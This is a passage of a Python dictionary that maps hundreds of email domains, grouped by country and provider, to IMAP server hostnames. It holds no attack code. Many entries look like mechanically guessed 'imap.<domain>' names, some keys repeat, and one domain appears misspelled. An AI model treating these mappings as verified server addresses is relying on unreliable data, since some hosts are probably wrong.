    "gmail.co": "imap.gmail.com",
    "webmail.fr": "imap.webmail.fr",
    "webmail.de": "imap.webmail.de",
    "emailaddress.com": "imap.emailaddress.com",
    "haimail.com": "imap.haimail.com",
    "cyberspace.org": "imap.cyberspace.org",
    "poboxes.com": "imap.poboxes.com",
    "execmail.com": "imap.execmail.com",
    "topmail.com": "imap.topmail.com",
    "topmailer.com": "imap.topmailer.com",
    "sendme.com": "imap.sendme.com",
    "jippii.net": "imap.jippii.net",
    "s1mail.com": "imap.s1mail.com",
    "emailias.com": "imap.emailias.com",
    "safersignup.de": "imap.safersignup.de",
    "spitfire.net": "imap.spitfire.net",
    "linuxfan.com": "imap.linuxfan.com",
    "geek.com": "imap.geek.com",
    "musician.org": "imap.musician.org",
    "iheartgames.com": "imap.iheartgames.com",
    "looksmart.com": "imap.looksmart.com",
    "looksmart.com.au": "imap.looksmart.com",
    "looksmart.co.uk": "imap.looksmart.com",
    "live.com.au": "imap-mail.outlook.com",
    "live.cn": "imap-mail.outlook.com",
    "live.co.za": "imap-mail.outlook.com",
    "live.net": "imap-mail.outlook.com",
    "live.in": "imap-mail.outlook.com",
    "outlook.in": "imap-mail.outlook.com",
    "outlook.com.ar": "imap-mail.outlook.com",
    "msn.com": "imap-mail.outlook.com",

    # ── Additional Yahoo Alias Domains ──────────────────────────────
    "y7mail.com": "imap.mail.yahoo.com",
    "yep.it": "imap.mail.yahoo.com",
    "bellatlantic.net": "imap.mail.yahoo.com",

    # ── Additional Generic Providers ─────────────────────────────────
    "mailinator.com": "imap.mailinator.com",
    "trashmail.com": "imap.trashmail.com",
    "guerrillamail.com": "imap.guerrillamail.com",
    "mailnull.com": "imap.mailnull.com",
    "owlpic.com": "imap.owlpic.com",
    "spamgourmet.com": "imap.spamgourmet.com",
    "spam.la": "imap.spam.la",
    "jetable.fr.nf": "imap.jetable.fr.nf",
    "maildrop.cc": "imap.maildrop.cc",
    "sharklasers.com": "imap.guerrillamail.com",
    "guerrillamailblock.com": "imap.guerrillamail.com",
    "grr.la": "imap.guerrillamail.com",
    "spam4.me": "imap.spam4.me",

    # ── Czech Republic ───────────────────────────────────────────────
    "seznam.cz": "imap.seznam.cz",
    "email.cz": "imap.email.cz",
    "centrum.cz": "imap.centrum.cz",
    "atlas.cz": "imap.atlas.cz",
    "volny.cz": "imap.volny.cz",
    "post.cz": "imap.post.cz",
    "tiscali.cz": "imap.tiscali.cz",

    # ── Poland ───────────────────────────────────────────────────────
    "wp.pl": "imap.wp.pl",
    "o2.pl": "imap.poczta.o2.pl",
    "onet.pl": "imap.poczta.onet.pl",
    "interia.pl": "imap.poczta.interia.pl",
    "gazeta.pl": "imap.gazeta.pl",
    "tlen.pl": "imap.tlen.pl",
    "poczta.fm": "imap.poczta.fm",
    "vp.pl": "imap.vp.pl",
    "go2.pl": "imap.go2.pl",
    "poczta.onet.pl": "imap.poczta.onet.pl",
    "op.pl": "imap.op.pl",
    "buziaczek.pl": "imap.buziaczek.pl",

    # ── Hungary ──────────────────────────────────────────────────────
    "freemail.hu": "imap.freemail.hu",
    "citromail.hu": "imap.citromail.hu",
    "t-online.hu": "imap.t-online.hu",
    "upcmail.hu": "imap.upcmail.hu",
    "vodafone.hu": "imap.vodafone.hu",
    "indamail.hu": "imap.indamail.hu",

    # ── Slovakia ─────────────────────────────────────────────────────
    "azet.sk": "imap.azet.sk",
    "atlas.sk": "imap.atlas.sk",
    "zoznam.sk": "imap.zoznam.sk",
    "post.sk": "imap.post.sk",
    "pobox.sk": "imap.pobox.sk",

    # ── Bulgaria ─────────────────────────────────────────────────────
    "abv.bg": "imap.abv.bg",
    "mail.bg": "imap.mail.bg",
    "dir.bg": "imap.dir.bg",
    "gbg.bg": "imap.gbg.bg",
    "b-zone.bg": "imap.b-zone.bg",

    # ── Croatia ──────────────────────────────────────────────────────
    "net.hr": "imap.net.hr",
    "vip.hr": "imap.vip.hr",
    "t-com.hr": "imap.t-com.hr",
    "iskon.hr": "imap.iskon.hr",
    "gmail.hr": "imap.gmail.com",

    # ── Serbia ───────────────────────────────────────────────────────
    "sbb.rs": "imap.sbb.rs",
    "verat.net": "imap.verat.net",
    "open.telekom.rs": "imap.open.telekom.rs",
    "mts.rs": "imap.mts.rs",
    "eunet.rs": "imap.eunet.rs",

    # ── Greece ───────────────────────────────────────────────────────
    "forthnet.gr": "imap.forthnet.gr",
    "otenet.gr": "imap.otenet.gr",
    "hol.gr": "imap.hol.gr",
    "ath.forthnet.gr": "imap.forthnet.gr",
    "tee.gr": "imap.tee.gr",
    "in.gr": "imap.in.gr",

    # ── Portugal ─────────────────────────────────────────────────────
    "sapo.pt": "imap.sapo.pt",
    "iol.pt": "imap.iol.pt",
    "net.pt": "imap.net.pt",
    "clix.pt": "imap.clix.pt",
    "netcabo.pt": "imap.netcabo.pt",
    "mail.pt": "imap.mail.pt",
    "portugalmail.pt": "imap.portugalmail.pt",

    # ── Spain ────────────────────────────────────────────────────────
    "terra.es": "imap.terra.es",
    "ya.com": "imap.ya.com",
    "jazztel.es": "imap.jazztel.es",
    "ono.com": "imap.ono.com",
    "wanadoo.es": "imap.wanadoo.es",
    "euskalnet.net": "imap.euskalnet.net",
    "correo.es": "imap.correo.es",
    "orange.es": "imap.orange.es",
    "vodafone.es": "imap.vodafone.es",
    "telefonica.net": "imap.telefonica.net",
    "movistar.es": "imap.movistar.es",

    # ── Italy ────────────────────────────────────────────────────────
    "tin.it": "imap.tin.it",
    "virgilio.it": "imap.virgilio.it",
    "libero.it": "imap.libero.it",
    "alice.it": "imap.alice.it",
    "inwind.it": "imap.inwind.it",
    "email.it": "imap.email.it",
    "fastweb.it": "imap.fastweb.it",
    "iol.it": "imap.iol.it",
    "katamail.com": "imap.katamail.com",
    "supereva.it": "imap.supereva.it",
    "teletu.it": "imap.teletu.it",
    "wind.it": "imap.wind.it",
    "interfree.it": "imap.interfree.it",
    "tiscali.it": "imap.tiscali.it",
    "vodafone.it": "imap.vodafone.it",

    # ── France ───────────────────────────────────────────────────────
    "wanadoo.fr": "imap.wanadoo.fr",
    "club-internet.fr": "imap.club-internet.fr",
    "free.fr": "imap.free.fr",
    "sfr.fr": "imap.sfr.fr",
    "bbox.fr": "imap.bbox.fr",
    "orange.fr": "imap.orange.fr",
    "cegetel.net": "imap.cegetel.net",
    "numericable.fr": "imap.numericable.fr",
    "telerama.fr": "imap.telerama.fr",
    "aliceadsl.fr": "imap.aliceadsl.fr",
    "ifrance.com": "imap.ifrance.com",
    "libertysurf.fr": "imap.libertysurf.fr",
    "tele2.fr": "imap.tele2.fr",
    "voila.fr": "imap.voila.fr",
    "noos.fr": "imap.noos.fr",

    # ── Netherlands ──────────────────────────────────────────────────
    "xs4all.nl": "imap.xs4all.nl",
    "hetnet.nl": "imap.hetnet.nl",
    "planet.nl": "imap.planet.nl",
    "quicknet.nl": "imap.quicknet.nl",
    "home.nl": "imap.home.nl",
    "upcmail.nl": "imap.upcmail.nl",
    "kpnmail.nl": "imap.kpnmail.nl",
    "ziggo.nl": "imap.ziggo.nl",
    "tele2.nl": "imap.tele2.nl",
    "bart.nl": "imap.bart.nl",
    "casema.nl": "imap.casema.nl",
    "chello.nl": "imap.chello.nl",
    "versatel.nl": "imap.versatel.nl",

    # ── Belgium ──────────────────────────────────────────────────────
    "skynet.be": "imap.skynet.be",
    "proximus.be": "imap.proximus.be",
    "telenet.be": "imap.telenet.be",
    "edpnet.be": "imap.edpnet.be",
    "brutele.be": "imap.brutele.be",
    "scarlet.be": "imap.scarlet.be",
    "belgacom.net": "imap.belgacom.net",
    "swing.be": "imap.swing.be",

    # ── Switzerland ──────────────────────────────────────────────────
    "bluewin.ch": "imap.bluewin.ch",
    "hispeed.ch": "imap.hispeed.ch",
    "sunrise.ch": "imap.sunrise.ch",
    "vtxnet.ch": "imap.vtxnet.ch",
    "swissonline.ch": "imap.swissonline.ch",
    "tic.ch": "imap.tic.ch",
    "freesurf.ch": "imap.freesurf.ch",

    # ── Austria ──────────────────────────────────────────────────────
    "chello.at": "imap.chello.at",
    "aon.at": "imap.aon.at",
    "utanet.at": "imap.utanet.at",
    "inode.at": "imap.inode.at",
    "liwest.at": "imap.liwest.at",
    "ainet.at": "imap.ainet.at",
    "drei.at": "imap.drei.at",
    "magnet.at": "imap.magnet.at",
    "kabsi.at": "imap.kabsi.at",

    # ── Sweden ───────────────────────────────────────────────────────
    "tele2.se": "imap.tele2.se",
    "spray.se": "imap.spray.se",
    "bredband.net": "imap.bredband.net",
    "bahnhof.se": "imap.bahnhof.se",
    "comhem.se": "imap.comhem.se",
    "glocalnet.net": "imap.glocalnet.net",
    "swipnet.se": "imap.swipnet.se",
    "ownit.se": "imap.ownit.se",
    "home.se": "imap.home.se",
    "passagen.se": "imap.passagen.se",

    # ── Norway ───────────────────────────────────────────────────────
    "tele2.no": "imap.tele2.no",
    "online.no": "imap.online.no",
    "broadpark.no": "imap.broadpark.no",
    "get.no": "imap.get.no",
    "start.no": "imap.start.no",
    "c2i.net": "imap.c2i.net",
    "frisurf.no": "imap.frisurf.no",
    "telenor.no": "imap.telenor.no",

    # ── Denmark ──────────────────────────────────────────────────────
    "bbonline.dk": "imap.bbonline.dk",
    "jubii.dk": "imap.jubii.dk",
    "post.dk": "imap.post.dk",
    "tdcspace.dk": "imap.tdcspace.dk",
    "stofa.dk": "imap.stofa.dk",
    "ofir.dk": "imap.ofir.dk",
    "mail.dk": "imap.mail.dk",
    "sol.dk": "imap.sol.dk",
    "stofanet.dk": "imap.stofanet.dk",

    # ── Finland ──────────────────────────────────────────────────────
    "suomi24.fi": "imap.suomi24.fi",
    "kolumbus.fi": "imap.kolumbus.fi",
    "welho.com": "imap.welho.com",
    "co.fi": "imap.co.fi",
    "luukku.com": "imap.luukku.com",
    "elisanet.fi": "imap.elisanet.fi",
    "saunalahti.fi": "imap.saunalahti.fi",
    "sonera.fi": "imap.sonera.fi",

    # ── UK Providers ─────────────────────────────────────────────────
    "btinternet.com": "imap.btinternet.com",
    "btopenworld.com": "imap.btinternet.com",
    "talk21.com": "imap.btinternet.com",
    "bt.com": "imap.btinternet.com",
    "sky.com": "imap.sky.com",
    "ntlworld.com": "imap.ntlworld.com",
    "virginmedia.com": "imap.virginmedia.com",
    "virgin.net": "imap.virginmedia.com",
    "tiscali.co.uk": "imap.tiscali.co.uk",
    "blueyonder.co.uk": "imap.blueyonder.co.uk",
    "demon.net": "imap.demon.net",
    "zen.co.uk": "imap.zen.co.uk",
    "plus.net": "imap.plus.net",
    "lineone.net": "imap.lineone.net",
    "supanet.com": "imap.supanet.com",
    "claranet.co.uk": "imap.claranet.co.uk",
    "freeserve.co.uk": "imap.freeserve.co.uk",
    "madasafish.com": "imap.madasafish.com",
    "onetel.com": "imap.onetel.com",
    "totalise.co.uk": "imap.totalise.co.uk",
    "talktalk.net": "imap.talktalk.net",
    "orange.co.uk": "imap.orange.co.uk",
    "ee.co.uk": "imap.ee.co.uk",
    "o2.co.uk": "imap.o2.co.uk",

    # ── Ireland ──────────────────────────────────────────────────────
    "eircom.net": "imap.eircom.net",
    "ireland.com": "imap.ireland.com",
    "indigo.ie": "imap.indigo.ie",
    "iolfree.ie": "imap.iolfree.ie",
    "iol.ie": "imap.iol.ie",
    "esatclear.ie": "imap.esatclear.ie",
    "gmail.ie": "imap.gmail.com",

    # ── Australia ────────────────────────────────────────────────────
    "optusnet.com.au": "imap.optusnet.com.au",
    "bigpond.com": "imap.bigpond.com",
    "bigpond.net.au": "imap.bigpond.com",
    "dodo.com.au": "imap.dodo.com.au",
    "iprimus.com.au": "imap.iprimus.com.au",
    "aapt.net.au": "imap.aapt.net.au",
    "westnet.com.au": "imap.westnet.com.au",
    "internode.on.net": "imap.internode.on.net",
    "tpg.com.au": "mail.tpg.com.au",
    "iiNet.net.au": "imap.iinet.net.au",
    "iinet.net.au": "imap.iinet.net.au",
    "adam.com.au": "imap.adam.com.au",
    "netspace.net.au": "imap.netspace.net.au",
    "pacific.net.au": "imap.pacific.net.au",
    "telstra.com": "imap.telstra.com",
    "bigpond.org": "imap.bigpond.com",
    "ozemail.com.au": "imap.ozemail.com.au",

    # ── New Zealand ──────────────────────────────────────────────────
    "clear.net.nz": "imap.clear.net.nz",
    "paradise.net.nz": "imap.paradise.net.nz",
    "xtra.co.nz": "imap.xtra.co.nz",
    "ihug.co.nz": "imap.ihug.co.nz",
    "actrix.co.nz": "imap.actrix.co.nz",
    "slingshot.co.nz": "imap.slingshot.co.nz",
    "snap.net.nz": "imap.snap.net.nz",

    # ── Canada ───────────────────────────────────────────────────────
    "sympatico.ca": "imap.sympatico.ca",
    "videotron.ca": "imap.videotron.ca",
    "shaw.ca": "imap.shaw.ca",
    "telus.net": "imap.telus.net",
    "sasktel.net": "imap.sasktel.net",
    "rogers.com": "imap.rogers.com",
    "look.ca": "imap.look.ca",
    "mts.net": "imap.mts.net",
    "eastlink.ca": "imap.eastlink.ca",
    "cogeco.ca": "imap.cogeco.ca",
    "cogeco.net": "imap.cogeco.ca",
    "primus.ca": "imap.primus.ca",
    "bell.net": "imap.bell.net",
    "bellnet.ca": "imap.bellnet.ca",
    "nb.sympatico.ca": "imap.nb.sympatico.ca",
    "hfx.eastlink.ca": "imap.eastlink.ca",

    # ── Brazil ───────────────────────────────────────────────────────
    "ig.com.br": "imap.ig.com.br",
    "terra.com.br": "imap.terra.com.br",
    "oi.com.br": "imap.oi.com.br",
    "uol.com.br": "imap.uol.com.br",
    "globo.com": "imap.globo.com",
    "globomail.com": "imap.globo.com",
    "r7.com": "imap.r7.com",
    "bol.com.br": "imap.bol.com.br",
    "zipmail.com.br": "imap.zipmail.com.br",
    "pop.com.br": "imap.pop.com.br",
    "brturbo.com.br": "imap.brturbo.com.br",
    "veloxmail.com.br": "imap.veloxmail.com.br",
    "oi.net.br": "imap.oi.com.br",
    "gbl.com.br": "imap.gbl.com.br",

    # ── Argentina ────────────────────────────────────────────────────
    "arnet.com.ar": "imap.arnet.com.ar",
    "fibertel.com.ar": "imap.fibertel.com.ar",
    "ciudad.com.ar": "imap.ciudad.com.ar",
    "telecentro.com.ar": "imap.telecentro.com.ar",
    "infovia.com.ar": "imap.infovia.com.ar",
    "speedy.com.ar": "imap.speedy.com.ar",

    # ── Mexico ───────────────────────────────────────────────────────
    "prodigy.net.mx": "imap.prodigy.net.mx",
    "infinitum.com.mx": "imap.infinitum.com.mx",
    "telmex.net": "imap.telmex.net",
    "cablevision.net.mx": "imap.cablevision.net.mx",
    "megacable.net.mx": "imap.megacable.net.mx",
    "axtel.net": "imap.axtel.net",

    # ── Colombia ─────────────────────────────────────────────────────
    "une.net.co": "imap.une.net.co",
    "edatel.net.co": "imap.edatel.net.co",
    "epm.net.co": "imap.epm.net.co",
    "claro.com.co": "imap.claro.com.co",
    "etb.net.co": "imap.etb.net.co",

    # ── Chile ────────────────────────────────────────────────────────
    "vtr.net": "imap.vtr.net",
    "terra.cl": "imap.terra.cl",
    "telsur.cl": "imap.telsur.cl",
    "entelchile.net": "imap.entelchile.net",
    "manquehue.net": "imap.manquehue.net",

    # ── India ────────────────────────────────────────────────────────
    "rediffmail.com": "imap.rediffmail.com",
    "sify.com": "imap.sify.com",
    "dataone.in": "imap.dataone.in",
    "bsnl.in": "imap.bsnl.in",
    "airtelmail.in": "imap.airtelmail.in",
    "mantraonline.com": "imap.mantraonline.com",
    "vsnl.com": "imap.vsnl.com",
    "vsnl.net": "imap.vsnl.net",
    "mtnl.net.in": "imap.mtnl.net.in",
    "sancharnet.in": "imap.sancharnet.in",
    "hathway.net": "imap.hathway.net",
    "satyam.net.in": "imap.satyam.net.in",
    "touchtelindia.net": "imap.touchtelindia.net",
    "lycos.co.in": "imap.lycos.com",
    "in.com": "imap.in.com",

    # ── Japan ────────────────────────────────────────────────────────
    "nifty.com": "imap.nifty.com",
    "so-net.ne.jp": "imap.so-net.ne.jp",
    "plala.or.jp": "imap.plala.or.jp",
    "biglobe.ne.jp": "imap.biglobe.ne.jp",
    "dti.ne.jp": "imap.dti.ne.jp",
    "ocn.ne.jp": "imap.ocn.ne.jp",
    "infoweb.ne.jp": "imap.infoweb.ne.jp",
    "excite.co.jp": "imap.excite.co.jp",
    "wakwak.com": "imap.wakwak.com",
    "hi-ho.ne.jp": "imap.hi-ho.ne.jp",
    "crest.itscom.net": "imap.itscom.net",
    "email.ne.jp": "imap.email.ne.jp",
    "jttk.or.jp": "imap.jttk.or.jp",
    "k-popup.ne.jp": "imap.k-popup.ne.jp",

    # ── China ────────────────────────────────────────────────────────
    "163.com": "imap.163.com",
    "126.com": "imap.126.com",
    "qq.com": "imap.qq.com",
    "sina.com": "imap.sina.com",
    "sina.cn": "imap.sina.com",
    "sohu.com": "imap.sohu.com",
    "21cn.com": "imap.21cn.com",
    "tom.com": "imap.tom.com",
    "189.cn": "imap.189.cn",
    "139.com": "imap.139.com",
    "yeah.net": "imap.yeah.net",
    "263.net": "imap.263.net",
    "x263.net": "imap.x263.net",
    "vip.163.com": "imap.vip.163.com",
    "vip.sina.com": "imap.vip.sina.com",
    "88.com": "imap.88.com",
    "foxmail.com": "imap.qq.com",

    # ── South Korea ──────────────────────────────────────────────────
    "naver.com": "imap.naver.com",
    "hanmail.net": "imap.daum.net",
    "daum.net": "imap.daum.net",
    "nate.com": "imap.nate.com",
    "korea.com": "imap.korea.com",
    "dreamwiz.com": "imap.dreamwiz.com",
    "paran.com": "imap.paran.com",
    "empas.com": "imap.empas.com",
    "lycos.co.kr": "imap.lycos.co.kr",
    "empal.com": "imap.empal.com",
    "hitel.net": "imap.hitel.net",
    "freechal.com": "imap.freechal.com",

    # ── Turkey ───────────────────────────────────────────────────────
    "mynet.com": "imap.mynet.com",
    "ttmail.com": "imap.ttmail.com",
    "superonline.com": "imap.superonline.com",
    "turk.net": "imap.turk.net",
    "doruk.net.tr": "imap.doruk.net.tr",
    "e-kolay.net": "imap.e-kolay.net",
    "turkcell.com.tr": "imap.turkcell.com.tr",
    "ttnet.net.tr": "imap.ttnet.net.tr",
    "kablo.net.tr": "imap.kablo.net.tr",
    "excite.com.tr": "imap.excite.com.tr",

    # ── Israel ───────────────────────────────────────────────────────
    "bezeqint.net": "imap.bezeqint.net",
    "zahav.net.il": "imap.zahav.net.il",
    "netvision.net.il": "imap.netvision.net.il",
    "walla.co.il": "imap.walla.co.il",
    "012.net.il": "imap.012.net.il",
    "inter.net.il": "imap.inter.net.il",
    "barak.net.il": "imap.barak.net.il",

    # ── South Africa ─────────────────────────────────────────────────
    "mweb.co.za": "imap.mweb.co.za",
    "telkomsa.net": "imap.telkomsa.net",
    "vodamail.co.za": "imap.vodamail.co.za",
    "iafrica.com": "imap.iafrica.com",
    "afrihost.com": "imap.afrihost.com",
    "global.co.za": "imap.global.co.za",
    "pixie.co.za": "imap.pixie.co.za",
    "tiscali.co.za": "imap.tiscali.co.za",

    # ── Indonesia ────────────────────────────────────────────────────
    "centrin.net.id": "imap.centrin.net.id",
    "plasa.com": "imap.plasa.com",
    "cbn.net.id": "imap.cbn.net.id",
    "rad.net.id": "imap.rad.net.id",
    "telkom.net.id": "imap.telkom.net.id",
    "sateIitku.net": "imap.sateIitku.net",
    "indosatm2.com": "imap.indosatm2.com",

    # ── Malaysia ─────────────────────────────────────────────────────
    "jaring.my": "imap.jaring.my",
    "maxis.net.my": "imap.maxis.net.my",
    "tm.net.my": "imap.tm.net.my",
    "po.my": "imap.po.my",
    "streamyx.com": "imap.streamyx.com",
    "unifi.com.my": "imap.unifi.com.my",

    # ── Philippines ──────────────────────────────────────────────────
    "pldtdsl.net": "imap.pldtdsl.net",
    "pacific.net.ph": "imap.pacific.net.ph",
    "smartbro.net": "imap.smartbro.net",
    "globe.com.ph": "imap.globe.com.ph",
    "info.com.ph": "imap.info.com.ph",

    # ── Thailand ─────────────────────────────────────────────────────
    "loxinfo.co.th": "imap.loxinfo.co.th",
    "truemail.co.th": "imap.truemail.co.th",
    "tha.nu": "imap.tha.nu",
    "thaimail.com": "imap.thaimail.com",
    "truemove.com": "imap.truemove.com",

    # ── Vietnam ──────────────────────────────────────────────────────
    "vnn.vn": "imap.vnn.vn",
    "hn.vnn.vn": "imap.hn.vnn.vn",
    "fpt.vn": "imap.fpt.vn",
    "hcm.fpt.vn": "imap.fpt.vn",

    # ── Egypt / Middle East ──────────────────────────────────────────
    "link.net": "imap.link.net",
    "tedata.net": "imap.tedata.net",
    "adsarabia.com": "imap.adsarabia.com",
    "naseej.net.sa": "imap.naseej.net.sa",
    "saudinetmail.com.sa": "imap.saudinetmail.com.sa",

    # ── Romania ──────────────────────────────────────────────────────
    "rdslink.ro": "imap.rdslink.ro",
    "rdstm.ro": "imap.rdstm.ro",
    "clicknet.ro": "imap.clicknet.ro",
    "fx.ro": "imap.fx.ro",
    "go.ro": "imap.go.ro",
    "mail.ro": "imap.mail.ro",
    "kappa.ro": "imap.kappa.ro",

    # ── Ukraine ──────────────────────────────────────────────────────
    "ukr.net": "imap.ukr.net",
    "i.ua": "imap.i.ua",
    "bigmir.net": "imap.bigmir.net",
    "meta.ua": "imap.meta.ua",
    "ua.fm": "imap.ua.fm",
    "email.ua": "imap.email.ua",

    # ── Privacy / Secure Email ────────────────────────────────────────
    "protonmail.com": "imap.protonmail.ch",
    "proton.me": "imap.protonmail.ch",
    "protonmail.ch": "imap.protonmail.ch",
    "mailfence.com": "imap.mailfence.com",
    "runbox.com": "imap.runbox.com",
    "posteo.de": "imap.posteo.de",
    "mailbox.org": "imap.mailbox.org",
    "startmail.com": "imap.startmail.com",
    "disroot.org": "imap.disroot.org",
    "riseup.net": "imap.riseup.net",
    "autistici.org": "imap.autistici.org",
    "countermail.com": "imap.countermail.com",
    "kolabnow.com": "imap.kolabnow.com",
    "hushmail.com": "imap.hushmail.com",
    "lavabit.com": "imap.lavabit.com",
    "scramble.io": "imap.scramble.io",
    "ctemplar.com": "imap.ctemplar.com",

    # ── Additional FastMail / Business Email ──────────────────────────
    "fastmail.com": "imap.fastmail.com",
    "fastmail.org": "imap.fastmail.com",
    "fastmail.net": "imap.fastmail.com",
    "fastmail.to": "imap.fastmail.com",
    "fastmail.cn": "imap.fastmail.com",
    "fmailbox.com": "imap.fastmail.com",
    "ftml.net": "imap.fastmail.com",
    "hailmail.net": "imap.fastmail.com",
    "150ml.com": "imap.fastmail.com",
    "allmail.net": "imap.fastmail.com",
    "bestmail.us": "imap.fastmail.com",
    "cluemail.com": "imap.fastmail.com",
    "elitemail.org": "imap.fastmail.com",
    "emailcorner.net": "imap.fastmail.com",
    "emailengine.net": "imap.fastmail.com",
    "emailengine.org": "imap.fastmail.com",
    "emailgroups.net": "imap.fastmail.com",
    "emailplus.org": "imap.fastmail.com",
    "emailuser.net": "imap.fastmail.com",
    "f-m.fm": "imap.fastmail.com",
    "fast-email.com": "imap.fastmail.com",
    "fast-mail.org": "imap.fastmail.com",
    "fastem.com": "imap.fastmail.com",
    "fastemail.us": "imap.fastmail.com",
    "fastemailer.com": "imap.fastmail.com",
    "fastest.cc": "imap.fastmail.com",
    "fastimap.com": "imap.fastmail.com",
    "fastmailbox.net": "imap.fastmail.com",
    "fdcserver.net": "imap.fastmail.com",
    "fea.st": "imap.fastmail.com",
    "flyinggeek.net": "imap.fastmail.com",
    "hotpop.com": "imap.fastmail.com",
    "imap-mail.com": "imap.fastmail.com",
    "inoutbox.com": "imap.fastmail.com",
    "internet-e-mail.de": "imap.fastmail.com",
    "internet-mail.de": "imap.fastmail.com",
    "internetemails.net": "imap.fastmail.com",
    "internetmailing.net": "imap.fastmail.com",
    "justemail.net": "imap.fastmail.com",
    "letterboxes.org": "imap.fastmail.com",
    "mailandftp.com": "imap.fastmail.com",
    "mailbolt.com": "imap.fastmail.com",
    "mailc.net": "imap.fastmail.com",
    "mailcan.com": "imap.fastmail.com",
    "mailfast.com": "imap.fastmail.com",
    "mailhaven.com": "imap.fastmail.com",
    "mailingaddress.org": "imap.fastmail.com",
    "mailite.com": "imap.fastmail.com",
    "mailnew.com": "imap.fastmail.com",
    "mailsent.net": "imap.fastmail.com",
    "mailservice.ms": "imap.fastmail.com",
    "mailup.net": "imap.fastmail.com",
    "mailworks.org": "imap.fastmail.com",
    "ml1.net": "imap.fastmail.com",
    "mm.st": "imap.fastmail.com",
    "myfastmail.com": "imap.fastmail.com",
    "mymacmail.com": "imap.fastmail.com",
    "nospammail.net": "imap.fastmail.com",
    "ownmail.net": "imap.fastmail.com",
    "petml.com": "imap.fastmail.com",
    "postinbox.com": "imap.fastmail.com",
    "postpro.net": "imap.fastmail.com",
    "proinbox.com": "imap.fastmail.com",
    "promessage.net": "imap.fastmail.com",
    "realemail.net": "imap.fastmail.com",
    "sent.as": "imap.fastmail.com",
    "speedymail.org": "imap.fastmail.com",
    "ssl-mail.com": "imap.fastmail.com",
    "swift-mail.com": "imap.fastmail.com",
    "the-fastest.net": "imap.fastmail.com",
    "the-quickest.com": "imap.fastmail.com",
    "theinternetemail.com": "imap.fastmail.com",
    "veryfast.biz": "imap.fastmail.com",
    "veryspeedy.net": "imap.fastmail.com",
    "warpmail.net": "imap.fastmail.com",
    "xsmail.com": "imap.fastmail.com",
    "yepmail.net": "imap.fastmail.com",
    "your-mail.com": "imap.fastmail.com",

    # ── Additional Outlook/Live Variants ──────────────────────────────
    "live.co.uk": "imap-mail.outlook.com",
    "live.co.nz": "imap-mail.outlook.com",
    "live.co.za": "imap-mail.outlook.com",
    "live.com.sg": "imap-mail.outlook.com",
    "live.com.pt": "imap-mail.outlook.com",
    "live.com.mx": "imap-mail.outlook.com",
    "live.com.my": "imap-mail.outlook.com",
    "live.com.ph": "imap-mail.outlook.com",
    "live.cl": "imap-mail.outlook.com",
    "live.com.ar": "imap-mail.outlook.com",
    "live.dk": "imap-mail.outlook.com",
    "live.fi": "imap-mail.outlook.com",
    "live.fr": "imap-mail.outlook.com",
    "live.se": "imap-mail.outlook.com",
    "live.no": "imap-mail.outlook.com",
    "live.nl": "imap-mail.outlook.com",
    "live.be": "imap-mail.outlook.com",
    "live.it": "imap-mail.outlook.com",
    "live.de": "imap-mail.outlook.com",
    "live.at": "imap-mail.outlook.com",
    "live.es": "imap-mail.outlook.com",
    "live.gr": "imap-mail.outlook.com",
    "live.jp": "imap-mail.outlook.com",
    "live.ru": "imap-mail.outlook.com",
    "live.eu": "imap-mail.outlook.com",
    "live.ie": "imap-mail.outlook.com",
    "live.in": "imap-mail.outlook.com",
    "live.hk": "imap-mail.outlook.com",
    "live.kr": "imap-mail.outlook.com",
    "live.com.hk": "imap-mail.outlook.com",
    "live.com.br": "imap-mail.outlook.com",
    "outlook.at": "imap-mail.outlook.com",
    "outlook.be": "imap-mail.outlook.com",
    "outlook.cl": "imap-mail.outlook.com",
    "outlook.co.il": "imap-mail.outlook.com",
    "outlook.co.nz": "imap-mail.outlook.com",
    "outlook.co.th": "imap-mail.outlook.com",
    "outlook.com.au": "imap-mail.outlook.com",
    "outlook.com.br": "imap-mail.outlook.com",
    "outlook.com.gr": "imap-mail.outlook.com",
    "outlook.com.pe": "imap-mail.outlook.com",
    "outlook.com.tr": "imap-mail.outlook.com",
    "outlook.com.vn": "imap-mail.outlook.com",
    "outlook.cz": "imap-mail.outlook.com",
    "outlook.de": "imap-mail.outlook.com",
    "outlook.dk": "imap-mail.outlook.com",
    "outlook.es": "imap-mail.outlook.com",
    "outlook.fr": "imap-mail.outlook.com",
    "outlook.hu": "imap-mail.outlook.com",
    "outlook.ie": "imap-mail.outlook.com",
    "outlook.it": "imap-mail.outlook.com",
    "outlook.jp": "imap-mail.outlook.com",
    "outlook.kr": "imap-mail.outlook.com",
    "outlook.lv": "imap-mail.outlook.com",
    "outlook.my": "imap-mail.outlook.com",
    "outlook.nl": "imap-mail.outlook.com",
    "outlook.ph": "imap-mail.outlook.com",
    "outlook.pt": "imap-mail.outlook.com",
    "outlook.sa": "imap-mail.outlook.com",
    "outlook.sg": "imap-mail.outlook.com",
    "outlook.sk": "imap-mail.outlook.com",
    "hotmail.at": "imap-mail.outlook.com",
    "hotmail.be": "imap-mail.outlook.com",
    "hotmail.ca": "imap-mail.outlook.com",
    "hotmail.cl": "imap-mail.outlook.com",
    "hotmail.co.il": "imap-mail.outlook.com",
    "hotmail.co.nz": "imap-mail.outlook.com",
    "hotmail.co.th": "imap-mail.outlook.com",
    "hotmail.co.uk": "imap-mail.outlook.com",
    "hotmail.com.ar": "imap-mail.outlook.com",
    "hotmail.com.au": "imap-mail.outlook.com",
    "hotmail.com.br": "imap-mail.outlook.com",
    "hotmail.com.hk": "imap-mail.outlook.com",
    "hotmail.com.mx": "imap-mail.outlook.com",
    "hotmail.com.pe": "imap-mail.outlook.com",
    "hotmail.com.sg": "imap-mail.outlook.com",
    "hotmail.com.tr": "imap-mail.outlook.com",
    "hotmail.com.vn": "imap-mail.outlook.com",
    "hotmail.cz": "imap-mail.outlook.com",
    "hotmail.de": "imap-mail.outlook.com",
    "hotmail.dk": "imap-mail.outlook.com",
    "hotmail.es": "imap-mail.outlook.com",
    "hotmail.fi": "imap-mail.outlook.com",
    "hotmail.fr": "imap-mail.outlook.com",
    "hotmail.gr": "imap-mail.outlook.com",
    "hotmail.hu": "imap-mail.outlook.com",
    "hotmail.ie": "imap-mail.outlook.com",
    "hotmail.it": "imap-mail.outlook.com",
    "hotmail.jp": "imap-mail.outlook.com",
    "hotmail.my": "imap-mail.outlook.com",
    "hotmail.nl": "imap-mail.outlook.com",
    "hotmail.no": "imap-mail.outlook.com",
    "hotmail.ph": "imap-mail.outlook.com",
    "hotmail.pt": "imap-mail.outlook.com",
    "hotmail.rs": "imap-mail.outlook.com",
    "hotmail.se": "imap-mail.outlook.com",
    "hotmail.sg": "imap-mail.outlook.com",
